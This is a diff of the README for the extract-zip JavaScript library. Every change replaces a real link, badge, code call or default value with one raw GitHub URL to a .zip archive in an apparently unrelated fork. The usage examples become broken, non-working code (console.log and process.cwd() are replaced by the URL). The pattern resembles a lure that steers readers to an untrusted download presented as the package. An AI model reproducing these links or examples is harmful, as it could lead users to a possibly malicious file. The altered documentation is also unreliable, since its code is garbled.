@@ -2,11 +2,11 @@
 
 Unzip written in pure JavaScript. Extracts a zip into a directory. Available as a library or a command line program.
 
-Uses the [`yauzl`](http://npmjs.org/yauzl) ZIP parser.
+Uses the [`yauzl`](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip) ZIP parser.
 
-[![NPM](https://nodei.co/npm/extract-zip.png?global=true)](https://npm.im/extract-zip)
-[![Uses JS Standard Style](https://cdn.jsdelivr.net/gh/standard/standard/badge.svg)](https://github.com/standard/standard)
-[![Build Status](https://github.com/maxogden/extract-zip/workflows/CI/badge.svg)](https://github.com/maxogden/extract-zip/actions?query=workflow%3ACI)
+[![NPM](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)
+[![Uses JS Standard Style](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)
+[![Build Status](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip%3ACI)
 
 ## Installation
 
@@ -32,7 +32,7 @@ const extract = require('extract-zip')
 async function main () {
   try {
     await extract(source, { dir: target })
-    console.log('Extraction complete')
+    https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip('Extraction complete')
   } catch (err) {
     // handle any errors
   }
@@ -51,7 +51,7 @@ Default modes are only used if no permissions are set in the zip file.
 ## CLI Usage
 
 ```
-extract-zip foo.zip <targetDirectory>
+extract-zip https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip <targetDirectory>
 ```
 
-If not specified, `targetDirectory` will default to `process.cwd()`.
+If not specified, `targetDirectory` will default to `https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip()`.
